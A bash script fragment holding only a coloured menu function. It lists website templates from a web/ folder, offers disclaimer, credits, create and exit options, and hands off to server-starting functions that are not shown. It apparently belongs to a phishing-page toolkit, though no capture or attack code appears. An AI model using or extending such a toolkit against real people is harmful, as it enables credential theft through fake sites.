#!/bin/bash

menu() {
  printf "\n"
  declare -a dirs
  option=1
  for d in web/*
  do
    dirs[option++]="${d%/}"
  done
  for((option=1;option<=${#dirs[@]};option++))
  do
    website=$(echo "${dirs[option]}" | awk -F/ '{print $NF}')
    printf "\e[1;92m[\e[0m\e[1;77m"$option"\e[0m\e[1;92m]\e[0m\e[1;91m "$website"\e[0m\n"
  done
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m96\e[0m\e[1;92m]\e[0m\e[1;93mDisclaimer  \e[0m\e[1;92m[\e[0m\e[1;77m97\e[0m\e[1;92m]\e[0m\e[1;93mCredits  \e[0m\e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93mCreate  \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93mExit\e[0m\n"
  printf "\n"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
  numberOfDirectory=${#dirs[@]}

  if [[ $option == 96 ]]; then
    disclaimer
    sleep 5
    clear
    banner
    menu

  elif [[ $option == 97 ]]; then
    printf "\e[1;93m [!] SullFurix (@sullfurix)\e[0m\n"
    sleep 3
    clear
    banner
    menu

  elif [[ $option == 98 ]]; then
    createPage
    website="create"
    server=$website
    startServer

  elif [[ $option == 99 ]]; then
    stop
    exit 1

  elif [[ ($option -le $numberOfDirectory) && ($option -gt 0) ]]; then
    website=$(echo "${dirs[option]}" | awk -F/ '{print $NF}')
    server=$website
    startServer

  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    banner
    menu
  fi
}
